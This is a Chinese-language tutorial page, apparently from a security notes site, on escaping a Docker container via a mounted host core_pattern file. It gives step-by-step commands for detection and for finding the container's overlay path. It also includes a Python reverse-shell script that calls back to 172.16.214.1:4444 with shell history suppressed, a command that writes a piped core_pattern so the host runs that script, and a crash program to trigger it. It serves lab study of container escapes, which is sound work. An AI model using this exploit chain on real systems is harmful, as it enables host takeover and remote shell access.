---
title: 挂载宿主机 procfs 逃逸

---

<center><h1>挂载宿主机 procfs 逃逸</h1></center>

---

## 前言

procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。

Docker默认情况下不会为容器开启 User Namespace

从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。

一般情况下不会将宿主机的 procfs 挂载到容器中，然而有些业务为了实现某些特殊需要，还是会有这种情况发生。

## 搭建

创建一个容器并挂载 /proc 目录

```bash
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
```

## 检测

如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs 

```bash
find / -name core_pattern
```

<img width="700" src="/img/1650013377.png">

## 复现

找到当前容器在宿主机下的绝对路径

```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
```

<img width="1400" src="/img/1650013469.png">

这就表示当前绝对路径为

```bash
/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged
```

安装 vim 和 gcc

```bash
apt-get update -y && apt-get install vim gcc -y
vim /tmp/.t.py
```

创建一个反弹 Shell 的 py 脚本

```python
#!/usr/bin/python3
import  os
import pty
import socket
lhost = "172.16.214.1"
lport = 4444
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   # os.remove('/tmp/.t.py')
   s.close()
if __name__ == "__main__":
   main()
```

给 Shell 赋予执行权限

```bash
chmod 777 .t.py
```

写入反弹 shell 到目标的 proc 目录下

```bash
echo -e "|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged/tmp/.t.py \rcore    " >  /host/proc/sys/kernel/core_pattern
```

在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序

```c++
vim t.c
#include<stdio.h>
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
gcc t.c -o t
./t
```

<img width="1200" src="/img/1650013515.png">

> 参考资料：https://xz.aliyun.com/t/8558

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年4月15日"
    }
  }
</script>